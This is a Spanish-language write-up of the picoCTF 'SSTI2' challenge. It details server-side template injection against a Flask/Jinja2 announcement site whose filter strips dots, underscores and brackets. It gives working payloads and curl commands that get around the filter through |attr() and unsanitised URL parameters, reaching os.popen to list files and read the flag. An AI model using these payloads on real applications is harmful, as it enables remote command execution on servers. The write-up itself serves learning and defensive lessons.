# Writeup: SSTI2
**Categoría:** Medium
**Fecha de conversión:** 2026-05-04

---

Writeup: SSTI2 (picoCTF)

Descripción del desafío


Se nos proporciona un sitio web que permite hacer anuncios. El autor afirma haber implementado una sanitización de entrada que elimina "cualquier tipo de caracteres que pudieran ser un problema". El objetivo es explotar una vulnerabilidad de Server-Side Template Injection (SSTI) para leer la flag.

Enumeración inicial


Al lanzar la instancia, tenemos una página con un formulario que envía una petición POST a /announce con un parámetro content. La respuesta muestra el contenido enviado dentro de una etiqueta <h1>.

Paso 1: Detectar si hay SSTI


Enviamos un payload básico de prueba:

text


content={{7*7}}


La respuesta muestra 49, lo que confirma que el motor de plantillas es Jinja2 (común en Flask) y que la inyección es posible.

Paso 2: Identificar el filtro de sanitización


Para entender qué caracteres son eliminados, enviamos una cadena con varios caracteres especiales:

text


content=._[](){}|&$#


La respuesta muestra (){}|&$#, indicando que los caracteres _, ., [ y ] han sido eliminados. El resto se conserva.


Esto significa que no podemos usar puntos para acceder a atributos (ej. objeto.atributo), ni guiones bajos (que son comunes en nombres como __class__), ni corchetes para indexación. Sin embargo, podemos usar | (filtros), (), {}, y otros símbolos.

Paso 3: Búsqueda de objetos disponibles en el contexto


En Jinja2, a menudo hay objetos globales como config, request, lipsum, cycler, joiner, etc. Para verificar si request está disponible, enviamos:

text


content={{ request|attr('method') }}


La respuesta es POST, lo que confirma que request existe y podemos usarlo. El filtro |attr('method') reemplaza el punto, ya que request.method no es posible por la eliminación del punto.

Paso 4: Plan de ataque


Necesitamos ejecutar comandos del sistema. La ruta típica en Jinja2 es:

text


objeto.__class__.__mro__[1].__subclasses__()...


Pero tenemos dos obstáculos:


```
    No podemos usar guiones bajos (_).

    No podemos usar puntos (.).

    No podemos usar corchetes ([).

```

Sin embargo, podemos:


```
    Usar |attr(nombre) para acceder a atributos (alternativa al punto).

    Pasar los nombres de atributos que contengan guiones bajos como parámetros GET, ya que el filtro solo actúa sobre el contenido del parámetro content, no sobre la URL.

```

Esto nos permite construir cadenas como __globals__ fuera del payload y referenciarlas mediante request.args.get('nombre').

Paso 5: Construcción del payload


El objetivo es llegar al módulo os y ejecutar os.popen('comando').read().


Usaremos lipsum como objeto base (está en los globales). Su __globals__ contiene os. La secuencia sería:


```
    lipsum.__globals__ → usando |attr('__globals__')

    __getitem__('os') → para obtener el módulo os.

    popen('comando')

    read()

```

Como no podemos escribir __globals__ directamente, lo pasamos por URL:

text


?g=__globals__&gi=__getitem__&p=popen&cmd=comando&r=read


Luego, en el payload usamos request.args.get('g') para obtener la cadena:

jinja2


{{ lipsum|attr((request|attr('args')|attr('get')('g'))) | attr((request|attr('args')|attr('get')('gi')))('os') | attr((request|attr('args')|attr('get')('p')))( (request|attr('args')|attr('get')('cmd')) ) | attr((request|attr('args')|attr('get')('r')))() }}


### Notas:


```
    request|attr('args') es equivalente a request.args (evita el punto).

    |attr('get') es el método get del diccionario args.

    Las cadenas se pasan como argumentos a attr().

    Se usan paréntesis para agrupar y llamar a los métodos.

```

Paso 6: Prueba de concepto


Primero verificamos que podemos obtener el módulo os:

text


curl -X POST '.../announce?g=__globals__&gi=__getitem__' \

```
  -d 'content={{ lipsum|attr((request|attr("args")|attr("get")("g")))|attr((request|attr("args")|attr("get")("gi")))("os")|string }}'

```

La respuesta muestra <module 'os' from '/usr/lib/python3.8/os.py'>. Confirmado.

Paso 7: Listado de archivos


Para saber dónde está la flag, listamos el directorio actual usando os.listdir('.'):

text


curl -X POST '.../announce?g=__globals__&gi=__getitem__&l=listdir&d=.' \

```
  -d 'content={{ lipsum|attr((request|attr("args")|attr("get")("g")))|attr((request|attr("args")|attr("get")("gi")))("os")|attr((request|attr("args")|attr("get")("l")))((request|attr("args")|attr("get")("d")))|string }}'

```

Respuesta: ['app.py', '__pycache__', 'flag', 'requirements.txt']. Vemos un archivo llamado flag.

Paso 8: Leer la flag


Ejecutamos cat **flag**:

text


curl -X POST '.../announce?g=__globals__&gi=__getitem__&p=popen&cmd=cat%20flag&r=read' \

```
  -d 'content={{ lipsum|attr((request|attr("args")|attr("get")("g")))|attr((request|attr("args")|attr("get")("gi")))("os")|attr((request|attr("args")|attr("get")("p")))((request|attr("args")|attr("get")("cmd")))|attr((request|attr("args")|attr("get")("r")))() }}'

```

La respuesta contiene la flag dentro del <h1>:

text


picoCTF{*****************************}


Reflexión sobre el filtro


El autor eliminó caracteres "peligrosos" como ., _, [, ]. Sin embargo, no consideró que los parámetros GET no son sanitizados, permitiendo pasar esos caracteres desde la URL. Además, el uso de |attr() y la capacidad de llamar métodos con () permitieron reconstruir toda la cadena de acceso.

Lecciones aprendidas


```
    La sanitización debe aplicarse a todas las entradas, incluyendo parámetros de la URL si se usan dentro de la plantilla.

    En SSTI, es crucial conocer los objetos globales disponibles (request, config, lipsum, etc.).

    El filtro attr() es una alternativa al punto y puede combinarse con request.args para evadir filtros basados en caracteres.

    Siempre listar directorios antes de intentar leer archivos para conocer la ubicación exacta de la flag.

```

